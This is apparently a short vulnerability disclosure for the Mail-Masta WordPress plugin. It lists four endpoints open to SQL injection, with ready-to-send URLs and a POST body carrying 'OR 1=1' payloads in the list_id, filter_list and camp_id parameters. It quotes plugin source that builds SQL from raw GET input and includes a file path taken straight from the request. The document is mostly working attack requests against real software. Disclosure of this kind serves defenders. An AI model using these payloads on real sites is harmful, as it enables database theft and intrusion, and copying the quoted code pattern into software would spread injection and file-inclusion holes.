Mail-Masta SQL Injection
=========================================
Page: ../wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated)

GET Parameter: list_id

http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php


csvexport.php:
    include($_GET['pl']);
    $list_id=$_GET['list_id'];

    global $wpdb;
    $mail_subscribers = $wpdb->prefix . "masta_subscribers";
    $masta_list = $wpdb->prefix . "masta_list";
    $check_sql = "SELECT * FROM $mail_subscribers WHERE list_id = $list_id";
    $check_list="SELECT * FROM $masta_list WHERE list_id= $list_id";


=========================================

Page: ../wp-content/plugins/mail-masta/inc/lists/view-list.php (Requires Wordpress admin)

GET Parameter: filter_list

http://my_wp_app/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1


=========================================

Page: ../wp-content/plugins/mail-masta/inc/campaign/count_of_send.php (Requires Wordpress admin)

POST Parameter: camp_id

http://my_wp_app/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php

=========================================


Page: ../wp-content/plugins/mail-masta/inc/campaign_save.php (Requires Wordpress admin)

POST Parameter: list_id

POST /wp-admin/admin-ajax.php?id= HTTP/1.1

...snip...

action=my_action&url=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Fmail-masta%2Finc%2Fcampaign_save.php&sender_selected_list_check=check&list_id=1+OR+1%3D1

=========================================
